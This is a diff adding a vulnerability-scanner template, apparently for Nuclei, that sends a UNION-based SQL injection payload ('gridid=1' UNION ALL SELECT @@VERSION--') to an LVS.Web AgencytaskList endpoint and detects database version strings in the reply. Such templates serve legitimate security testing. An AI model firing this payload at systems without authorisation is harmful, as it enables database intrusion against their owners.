@@ -1,0 +1,39 @@
+id: agencytasklist-sql-injection
+
+info:
+  name: SQL Injection in AgencytaskList Endpoint
+  author: chippa vijay kumar
+  severity: critical
+  description: This template checks for SQL injection vulnerability by sending a payload that attempts to retrieve the SQL server version through the AgencytaskList endpoint.
+  tags: sql-injection, sqli, critical
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r"
+
+    headers:
+      Host: your-ip
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+      Content-Type: "text/plain; charset=UTF-8"
+      Accept-Encoding: "gzip, deflate"
+      Accept: "*/*"
+      Connection: "keep-alive"
+
+    body: |
+      src=AgencytaskList
+      gridid=1' UNION ALL SELECT @@VERSION--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "PostgreSQL"
+          - "MySQL"
+          - "Oracle"
+        part: body
+
+      - type: status
+        status:
+          - 200
